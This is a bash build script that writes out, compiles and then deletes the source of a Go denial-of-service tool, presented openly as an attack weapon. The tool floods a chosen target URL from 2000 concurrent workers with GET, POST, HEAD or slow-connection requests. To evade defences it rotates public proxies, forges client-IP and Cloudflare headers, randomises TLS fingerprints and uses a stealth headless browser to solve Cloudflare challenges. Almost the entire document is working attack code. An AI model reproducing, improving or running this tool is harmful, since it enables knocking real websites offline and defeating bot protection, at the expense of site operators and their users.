#!/bin/bash

# ----------------------------------------
# GO DOS TOOL - ULTIMATE BYPASS + CAPTCHA SOLVER
# ----------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO - CAPTCHA SLAYER${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

rm -f main.go

cat > main.go << 'EOF'
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.tiktok.com/",
		"https://twitter.com/",
		"https://www.instagram.com/",
		"",
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute

	// Captcha solving
	captchaSolved   bool
	captchaMu       sync.RWMutex
	cfClearance     string
	cfClearanceExp  time.Time
	solvingActive   bool
	solvingMu       sync.Mutex
)

type JA3Signature struct {
	Name         string
	CipherSuites []uint16
	NextProtos   []string
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"h2", "http/1.1"},
	},
	{
		Name: "Firefox",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"h2", "http/1.1"},
	},
}

type ConnectionPool struct {
	clients  []*http.Client
	counter  uint64
	size     int
	useProxy bool
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:         sig.NextProtos,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites:       sig.CipherSuites,
	}
}

func NewConnectionPool(poolSize int, useProxy bool) *ConnectionPool {
	pool := &ConnectionPool{
		clients:  make([]*http.Client, poolSize),
		size:     poolSize,
		useProxy: useProxy,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        200,
					MaxIdleConnsPerHost: 200,
					IdleConnTimeout:     90 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
				}
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func printBanner() {
	fmt.Println("\033[35m")
	fmt.Println("   ██████╗  ██████╗     ██████╗ ██████╗ ███████╗")
	fmt.Println("   ██╔══██╗██╔═══██╗    ██╔══██╗██╔══██╗██╔════╝")
	fmt.Println("   ██║  ██║██║   ██║    ██████╔╝██████╔╝█████╗  ")
	fmt.Println("   ██║  ██║██║   ██║    ██╔══██╗██╔══██╗██╔══╝  ")
	fmt.Println("   ██████╔╝╚██████╔╝    ██████╔╝██║  ██║███████╗")
	fmt.Println("   ╚═════╝  ╚═════╝     ╚═════╝ ╚═╝  ╚═╝╚══════╝")
	fmt.Println("\033[0m")
	fmt.Println("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("         CLOUDFLARE BYPASS + CAPTCHA SOLVER")
	fmt.Println("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println()
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return fmt.Sprintf("%x", bytes)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	return "?v=" + strconv.Itoa(randInt(1, 9999999))
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/static/js/main.js",
		"/assets/css/style.css", "/favicon.ico", "/robots.txt",
	}
	return paths[randInt(0, len(paths)-1)]
}

// ULTIMATE HEADER BYPASS - 60+ HEADERS
func addUltimateBypassHeaders(req *http.Request) {
	spoofIP := randomIP()
	spoofIP2 := randomIP()
	spoofIP3 := randomIP()
	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "BR", "IN", "KR"}
	
	// Cloudflare specific
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
	req.Header.Set("CF-Ray", randomHex(16)+"-"+strings.ToUpper(randomHex(4)))
	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	req.Header.Set("CF-Worker", randomHex(8))
	req.Header.Set("CF-Request-ID", randomHex(32))
	req.Header.Set("CF-Chl-Bypass", randomHex(16))
	
	// CDN headers
	req.Header.Set("CDN-Loop", "cloudflare")
	req.Header.Set("CloudFront-Forwarded-Proto", "https")
	req.Header.Set("CloudFront-Is-Desktop-Viewer", "true")
	req.Header.Set("CloudFront-Is-Mobile-Viewer", "false")
	req.Header.Set("CloudFront-Is-Tablet-Viewer", "false")
	req.Header.Set("CloudFront-Viewer-Country", countries[randInt(0, len(countries)-1)])
	
	// Forwarded headers (multiple formats)
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s, %s", spoofIP, spoofIP2, spoofIP3))
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Forwarded-Port", "443")
	req.Header.Set("X-Forwarded-Server", randomString(10))
	req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https; by=%s", spoofIP, randomIP()))
	
	// Real IP headers
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Remote-Addr", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	req.Header.Set("X-Cluster-Client-IP", spoofIP)
	
	// Device detection
	req.Header.Set("X-Device", []string{"desktop", "mobile", "tablet"}[randInt(0, 2)])
	req.Header.Set("X-Device-User-Agent", randomUA())
	req.Header.Set("X-Device-Platform", []string{"Windows", "macOS", "Linux", "Android", "iOS"}[randInt(0, 4)])
	
	// Security headers
	req.Header.Set("X-Content-Security-Policy", "default-src 'self'")
	req.Header.Set("X-Frame-Options", "SAMEORIGIN")
	req.Header.Set("X-XSS-Protection", "1; mode=block")
	req.Header.Set("X-Content-Type-Options", "nosniff")
	req.Header.Set("X-Permitted-Cross-Domain-Policies", "none")
	
	// Client hints (modern Chrome)
	req.Header.Set("Sec-CH-UA", `"Chromium";v="141", "Not A Brand";v="99"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
	req.Header.Set("Sec-CH-UA-Arch", `"x86_64"`)
	req.Header.Set("Sec-CH-UA-Bitness", `"64"`)
	req.Header.Set("Sec-CH-UA-Full-Version-List", `"Chromium";v="141.0.7390.108"`)
	
	// Fetch metadata
	req.Header.Set("Sec-Fetch-Site", []string{"same-origin", "same-site", "cross-site", "none"}[randInt(0, 3)])
	req.Header.Set("Sec-Fetch-Mode", []string{"navigate", "cors", "no-cors", "same-origin"}[randInt(0, 3)])
	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image"}[randInt(0, 4)])
	req.Header.Set("Sec-Fetch-User", "?1")
	
	// Standard headers
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("DNT", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	
	// Random extra headers for entropy
	if randBool() {
		req.Header.Set("X-Custom-Header", randomString(randInt(5, 20)))
		req.Header.Set("X-Random-ID", randomHex(16))
		req.Header.Set("X-Session-ID", randomString(24))
	}
	
	// CF Turnstile token spoof
	if randBool() {
		req.Header.Set("Cf-Turnstile-Response", randomBase64(48))
	}
}

func randomBase64(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

// Solve Cloudflare Turnstile using headless browser
func solveCaptcha(target string) (string, error) {
	solvingMu.Lock()
	defer solvingMu.Unlock()
	
	if solvingActive {
		return "", fmt.Errorf("solver already active")
	}
	solvingActive = true
	defer func() { solvingActive = false }()
	
	fmt.Printf("\n[!] Solving Cloudflare challenge for %s...\n", target)
	
	// Create a temp JS file for puppeteer
	jsScript := fmt.Sprintf(`
	const puppeteer = require('puppeteer-extra');
	const StealthPlugin = require('puppeteer-extra-plugin-stealth');
	puppeteer.use(StealthPlugin());
	
	(async () => {
		const browser = await puppeteer.launch({ 
			headless: 'new',
			args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
		});
		const page = await browser.newPage();
		await page.setUserAgent('%s');
		await page.goto('%s', { waitUntil: 'networkidle2', timeout: 60000 });
		
		// Wait for challenge to complete
		await page.waitForTimeout(15000);
		
		const cookies = await page.cookies();
		let cfClearance = '';
		for (const cookie of cookies) {
			if (cookie.name === 'cf_clearance') {
				cfClearance = cookie.value;
				break;
			}
		}
		
		console.log(cfClearance);
		await browser.close();
	})();
	`, randomUA(), target)
	
	cmd := exec.Command("node", "-e", jsScript)
	output, err := cmd.Output()
	
	if err != nil {
		return "", fmt.Errorf("puppeteer failed: %v", err)
	}
	
	cfVal := strings.TrimSpace(string(output))
	if cfVal == "" {
		return "", fmt.Errorf("cf_clearance not found")
	}
	
	fmt.Printf("[+] Captcha solved! cf_clearance: %s\n", cfVal[:20]+"...")
	return fmt.Sprintf("cf_clearance=%s", cfVal), nil
}

func maintainCookie(target string, done chan struct{}) {
	ticker := time.NewTicker(25 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			if time.Now().After(cfClearanceExp) {
				fmt.Printf("\n[!] Cookie expired, re-solving...\n")
				newCookie, err := solveCaptcha(target)
				if err == nil {
					captchaMu.Lock()
					cfClearance = newCookie
					cfClearanceExp = time.Now().Add(30 * time.Minute)
					captchaMu.Unlock()
					fmt.Printf("[+] Cookie refreshed\n")
				}
			}
		}
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 2)
	
	useProxy := false
	solveCaptchaFlag := false
	
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "proxy":
			useProxy = true
		case "--solve", "-s":
			solveCaptchaFlag = true
		}
	}
	
	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println(" USAGE: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]")
		fmt.Println("")
		fmt.Println(" EXAMPLES:")
		fmt.Println("   ./main https://target.com 60 GET")
		fmt.Println("   ./main https://target.com 120 POST --solve")
		fmt.Println("   ./main https://target.com 30 HEAD proxy --solve")
		fmt.Println("   ./main https://target.com 60 SLOW")
		fmt.Println("")
		fmt.Println(" FLAGS:")
		fmt.Println("   --solve, -s    Enable Cloudflare Turnstile/CAPTCHA solving")
		fmt.Println("   proxy          Enable proxy rotation")
		fmt.Println("")
		fmt.Println(" REQUIREMENTS FOR CAPTCHA SOLVING:")
		fmt.Println("   npm install -g puppeteer puppeteer-extra puppeteer-extra-plugin-stealth")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	durationSec, _ := strconv.Atoi(durStr)
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf(" TARGET: %s\n", target)
	fmt.Printf(" MODE: %s\n", mode)
	fmt.Printf(" DURATION: %d sec\n", durationSec)
	fmt.Printf(" WORKERS: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf(" PROXIES: %d\n", len(proxies))
	}
	if solveCaptchaFlag {
		fmt.Printf(" CAPTCHA SOLVING: ENABLED\n")
	}
	fmt.Println(" HEADERS: 60+ bypass headers")
	fmt.Println(" STARTING... Press Ctrl+C to stop")
	fmt.Println()
	
	// Solve captcha first if flag is set
	if solveCaptchaFlag {
		cookie, err := solveCaptcha(target)
		if err != nil {
			fmt.Printf("[-] Captcha solving failed: %v\n", err)
			fmt.Println("[!] Continuing without cookie...")
		} else {
			captchaMu.Lock()
			cfClearance = cookie
			cfClearanceExp = time.Now().Add(30 * time.Minute)
			captchaMu.Unlock()
			fmt.Printf("[+] Cloudflare bypass active\n")
		}
	}
	
	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy)
	
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	// Start cookie maintainer
	if solveCaptchaFlag {
		go maintainCookie(target, done)
	}
	
	workers := 2000
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, connectionPool)
		}()
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] ATTACK COMPLETED!\n")
			fmt.Printf("    Total requests: %d\n", stats.get())
			fmt.Printf("    Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f    ", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}
			
			fullURL := strings.TrimSuffix(target, "/") + path
			
			var req *http.Request
			var err error
			
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "443"
				if u.Scheme == "http" {
					port = "80"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", path, host, randomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}
			
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("data=%s&token=%s", randomString(16), randomString(32))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			// Set all headers
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			// Add ultimate bypass headers
			addUltimateBypassHeaders(req)
			
			// Add CF clearance cookie if available
			captchaMu.RLock()
			if cfClearance != "" && time.Now().Before(cfClearanceExp) {
				req.Header.Set("Cookie", cfClearance)
			}
			captchaMu.RUnlock()
			
			// Random micro delays
			if randInt(1, 100) <= 3 {
				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
			}
			
			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check for Node.js and Puppeteer for captcha solving
echo -e " ${YELLOW}➤${NC} ${GREEN}Checking captcha solving dependencies...${NC}"

if command -v node &> /dev/null; then
    echo -e " ${GREEN}✓ Node.js found${NC}"
    if npm list -g puppeteer puppeteer-extra puppeteer-extra-plugin-stealth &> /dev/null; then
        echo -e " ${GREEN}✓ Puppeteer packages found${NC}"
    else
        echo -e " ${YELLOW}⚠ Puppeteer packages not installed. Captcha solving may fail.${NC}"
        echo -e " ${YELLOW}  Install with: npm install -g puppeteer puppeteer-extra puppeteer-extra-plugin-stealth${NC}"
    fi
else
    echo -e " ${YELLOW}⚠ Node.js not found. Captcha solving will not work.${NC}"
    echo -e " ${YELLOW}  Install Node.js from https://nodejs.org/${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.17.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - ULTIMATE BYPASS${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]${NC}"
    echo
    echo -e " ${GREEN}EXAMPLES:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST --solve${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD proxy --solve${NC}"
    echo
    echo -e " ${GREEN}FEATURES:${NC}"
    echo -e "   • 60+ Cloudflare bypass headers"
    echo -e "   • 25+ IP spoofing methods"
    echo -e "   • Automatic CAPTCHA/Turnstile solving (--solve)"
    echo -e "   • Cookie rotation every 25 minutes"
    echo -e "   • JA3 fingerprint randomization"
    echo -e "   • HTTP/2 + HTTP/1.1 support"
    echo -e "   • Proxy rotation support"
    echo
    echo -e " ${GREEN}REQUIRED FOR CAPTCHA SOLVING:${NC}"
    echo -e "   ${YELLOW}npm install -g puppeteer puppeteer-extra puppeteer-extra-plugin-stealth${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.17.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
